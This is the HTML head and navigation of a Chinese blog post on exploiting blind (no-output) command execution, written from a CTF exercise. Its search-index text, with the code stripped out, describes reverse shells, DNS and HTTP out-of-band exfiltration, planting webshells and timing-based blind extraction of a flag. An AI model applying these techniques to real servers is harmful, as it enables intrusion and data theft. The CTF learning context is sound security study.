<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>无回显命令执行 | hybcx</title><meta name="keywords" content="基本知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="无回显命令执行"><meta name="application-name" content="无回显命令执行"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="无回显命令执行"><meta property="og:url" content="http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 没错，本篇也是在CTF下遇到无回显命令执行之后来进行的学习，不过网上找了很多文章感觉没一个满意的，只能东拼西凑了。 接下来就开始学习之旅： 在渗透测试、漏洞挖掘或安全研究的过程中，我们会遇到很多无回显的命令执行点。面对这些无回显的命令执行点，我们很难获取命令执行结果，甚至无法判断命令"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 前言 没错，本篇也是在CTF下遇到无回显命令执行之后来进行的学习，不过网上找了很多文章感觉没一个满意的，只能东拼西凑了。 接下来就开始学习之旅： 在渗透测试、漏洞挖掘或安全研究的过程中，我们会遇到很多无回显的命令执行点。面对这些无回显的命令执行点，我们很难获取命令执行结果，甚至无法判断命令"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '无回显命令执行',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 无回显判断, 0x03 CTF场景, 0x04 绕过方法, 4.1 反弹shell, 4.2 DNS外带, 4.3 http请求, 4.4 执行命令（需要站点目录具有写权限）, 4.5 直接写入或外部下载webshell, 4.6 nc外带, 4.7 http外带, 4.8 在vps上建立记录脚本, 4.9 burp(Collaborator Client), 0x05 py脚本（进阶）, 5.1 Linux, 5.2 Windows, 5.3 枚举flag, 0x06 CTF题目实战, NewStarCTF 2023 week3 RCE, 0x07 参考文章前言没错本篇也是在下遇到无回显命令执行之后来进行的学习不过网上找了很多文章感觉没一个满意的只能东拼西凑了接下来就开始学习之旅在渗透测试漏洞挖掘或安全研究的过程中我们会遇到很多无回显的命令执行点面对这些无回显的命令执行点我们很难获取命令执行结果甚至无法判断命令是否执行成功本篇文章主要讨论面对这些无回显的命令执行点时的判断和利用方法无回显判断首先我们需要知道该点是否存在命令执行漏洞或者我们的命令是否执行成功了这里的研判方法有很多种最常用的是直接通过延时判断类似我们注入里的时间盲注类似似的函数还有和值得一提的是下并没有命令那么如何通过时间延时的方式判断环境下的命令执行呢我们可以通过回环来达到强制延时的效果下同样试用我们还可以通过命令在不同环境下的执行方式来判断目标的操作系统类型这里借用参考文章的图片了延时判断法是在无回显情况下最简单的判断方式优点是能分辨操作系统无论目标是否出网都能判断缺点是只能判断不能利用场景在中有时会遇到无回显就是说虽然可以进行命令执行但却看不到命令执行的结果也不知道命令是否被执行测试代码如下命令执行函数我用的是因为这个函数本身是没有回显的拿来做测试简直不能再合适如上图我们执行之后发现页面并没有回显数据我们首先用命令看看命令是否被成功执行了看下图它转了五秒之后才恢复说明命令是执行了的绕过方法反弹遇到这种无回显的命令执行很常见的一个思路是反弹因为它虽然不会将命令执行的结果输出在屏幕上但实际上这个命令它是执行了的那我们就将反弹到自己服务器上然后再执行命令肯定就可以看到回显了一般来讲我们反弹都用的这条命令这里呢我复现一直不成功估计就是环境配置问题因此这里还是学个思路吧不想搭环境费时间了使用指定的反弹可以看到他这里已经反弹成功但我不知道为何复现不成功也可以将命令写入文件之后在存在命令执行的地方输入即可反弹攻击者也可以启动服务并在站点目录下存放一个文件里面写着反弹命令成功反弹到外带发起一个请求需要通过中的命令或者命令然后这里推荐一个的利用平台注册账号之后会给一个域名当发起的请求中含有这个域名时平台就会有记录这里也可以利用平台如下命令域如上图可以看到我们成功令数据回显至平台上去那么为了让它显示出剩余的结果我们就需要用到的命令用命令就可以实现对行的完美划分结合上面两个图片可以看到我们可以遍历回显出所有目录下的文件但是值得注意的是因为有的字符可能会无法显示或者只显示部分信息所以说执行命令的时候推荐使用编码然后再解开就好不过缺点很明显似乎找不到一个方法可以让回显内容完全并且我的这条命令不知为何执行不了注意命令执行时要避免空格空格会导致空格后面的命令执行不到将读取的文件命令用反引号包含起来拼接的域名有长度限制举个例子用替换读取文件中的空格且对输出结果编码然后拼接域名另一种方法请求靶机通过向发起请求监听到请求则代表命令执行成功注意命令不产生请求靶机这里复现一直不成功找了几篇文章发现目标服务器向个人的公网服务器发起请求当该公网服务器收到请求就代表命令有执行举个例子捏个人的公网服务器使用开始监听目标服务器使用公网机端口号可以看到公网服务器的该端口有请求注命令不产生请求估计这里不成功的原因在于我使用的且没出网依旧处于内网正常的话应该是下图执行命令需要站点目录具有写权限利用命令利用命令利用输出结果到文件利用下载或者利用打包为压缩为解压缩利用解压缩这里看一个网上例子复现不好找通过命令执行直接得到文件内容将做为参数传递给然后就执行了这个命令生成文件在去访问就能得到的内容也就是的内容最后找到直接写入或外部下载直接写入需要站点目录具有写权限外部下载目标服务器可以连接外网或可以与攻击机互通且能执行命令攻击机使用下载使用参数来指定一个文件名外带靶机当不能使用参数调整为靶机外带看到一篇文章推荐的信道给定的注意如果要编码的话要加个给定的上图红色标注的地方就是加密的结果我们解密看到下图可以看到回显的数据很多似乎这是个优点在上建立记录脚本当目标服务器可以向公网服务器发起请求并且能执行命令或命令在个人公网服务器的根目录构造一个记录脚本在目标服务器的测试点发送任意一条请求进行测试将获得的进行解码即可不过这里没看懂也没复现成功使用将文件上传到的这是一个类似的插件其功能比强大可以不用搭建任何环境去监听和请求也可以很方便的查看请求包和等获取分配给的链接打开主界面菜单点击此处似乎是低版本的步骤如上图我这里是版本的直接就集成了靶机拼接并在命令执行处提交即可查看收到的数据脚本进阶上述讲得都是利用现有工具进行绕过但是进阶的题目似乎都要求你有编写脚本的能力去进行盲注这里也是有幸找到了一篇文章对此的分析虽然脚本不会写但我先立志看懂他假设服务器不出网并且目录不可写可以用类似盲注的方式得到回显这次主要写下的其实也差不多这里的情况就与我做的题目一样方法和延时注入差不多截取命令回显结果循环进行对比对比到了就用延时首先要了解语句符合条件执行的语句符合条件执行的语句上面都不符合执行的语句这次只需要用到一个判断所以不用这么复杂这里的条件成立就会执行下面的语句取出第一个字符对比是否为是则秒下反引号是命令替换一般来说是将执行获得的结果再执行一次这里可以理解为将命令的结果保存下来后与等号后面的字符对比命令是切割字符串就是得到命令结果的第一个字符以此类推在一些回显中可能会出现很多符号还有中文什么的为了避免回显结果不准确的情况可以通过编码后再执行操作这里使用的原因是只有大写字母和和减少了爆破字符数量提高了回显结果的精准度下面用写个脚本包含大写字母和数字字符以及等号字符这些字符将用于构建注入负载变量包含要执行的命令而变量包含目标其中将包含注入的命令是一个包含命令注入的字符串例如如果是是那么将是一个字符串用于检查命令输出的第一个字符是否等于发送请求到并记录响应的时间如果响应时间大于秒假设命令输出的字符与匹配则将添加到中是标准库中模块中的一个常量它包含了英文字母的大写版本即到的个字符具体来说包含以下字符这个常量通常用于字符串操作特别是在需要引用英文大写字母集合的情况下例如您可以使用来生成随机的大写字母检查字符串中是否包含大写字母等等这个常量提供了一个方便的方式来引用大写字母集合而不必手动键入所有大写字母以上是参考回答而去了解代码含义下面是实例图片在中可以通过带出命令但是不会把命令结果拼接到上可以用循环得到结果再进行拼接这里就是多提一句重点还是在不出网的情况下中的问题就是命令结果保存在哪里并不可以像一样直接截取这次假设是目录不可写那就需要思考下写到别的目录该怎么读到将命令回显的结果写到一个可写的目录下使用将命令结果编码原因同上可以避免特殊字符提高结果的准确度用参数去除多余的字符将去除掉多余字符的编码再次写入一个文件编码命令文件格式去除的是首行尾行的多余字符参数是匹配到相同的字符然后去除用循环去除换行符写入对比字符串以下是对上述代码的解释这是一个批处理脚本主要用于将文件的内容逐行写入文件并保留文件中的空行以下是对脚本的逐行分析这是批处理脚本的一般开头它会关闭批处理的命令回显这意味着在运行脚本时不会显示每个命令的文本这使得输出更清晰因为不会显示命令本身只会显示命令的结果这是脚本的核心部分它执行以下操作这部分使用命令来循环处理文件中的内容部分指示不使用分隔符因此整行文本将被读取对于每行从文件读取的文本使用命令将该行文本写入标准输出屏幕并通过重定向将其捕获这实际上是将每行文本逐行写入标准输出但没有显示在屏幕上这部分将标准输出中的内容即文件中的每一行文本重定向到文件中从而将文件中的内容逐行写入文件如果文件不存在将创建它如果已经存在将覆盖其内容先写入上面的去除换行符不打印输出是接收输入这样就会到这个位置是从头开始匹配是类似错误号的东西如果上面这个命令执行成功了就返回反之如果匹配不到的话这里就是然后跳到这里用原因是不会传到下个命令在下个命令看来这个是执行成功的所以返回也会触发延迟为了避免所以使用跳过这里就是成功匹配返回触发延迟然后再写入匹配字符串正确字符延迟错误字符不延迟同样用写个脚本下面是实例图片枚举服务器未联网无写入权限无法等一系列操作只能通过枚举二分查找暴力查询构造脚本遍历题目实战先是简单的反序列化随后是一个无回显的绕过下面简单写一个链码表对上述代码的解释这是一个条件语句其中包含一个条件测试如果条件测试为真则执行即让脚本休眠秒这是一种时间延迟技巧通常用于时间盲注攻击攻击者根据服务端的响应时间来推断条件是否成立这部分的目的是列出根目录下的文件和目录并使用和命令来选择其中一个字符让我详细解释这部分列出了根目录下的文件和目录管道操作符将命令的输出传递给下一个命令这是一个命令它根据行号是否等于来选择特定行是一个变量它代表外部循环中的是命令中的一个特殊变量表示当前正在处理的记录行的行号再次使用管道操作符将命令的输出传递给下一个命令这是命令它根据字符位置来选择特定字符是一个变量它代表内部循环中的这部分是条件测试的一部分它检查前面命令的输出字符是否等于变量其中是内部循环中的字符这里我发现此处代码之间用了两对花括号这里我就疑问为何他用了两对括号于是我用之前的先运行一下发现如下报错如上图发现是错误意思是字典格式的错误搜索了一下发现这个解释的很好这次写的时候遇到了奇怪的我一开始是这么写的但是这样会报错后来发现因为自己用大括号作为占位符如果字符串里本身有大括号还得转义一下具体怎么转义就是用两个大括号所以应该改成这样这样才能正常输出之后再有类似的题我再更新吧这次感觉只是简单了解了似乎还是不熟练啊参考文章无回显条件下的命令执行判断和利用方式研究实战类无回显的命令执行的种反弹信道命令执行无回显利用入门篇命令执行无回显的判断方法及相关例题无回显的渗透技巧篇之无回显下的无回显命令执行超全的命令代码执行漏洞无回显的姿势总结附带详细代码和测试分析过程',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-22 21:15:33',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span 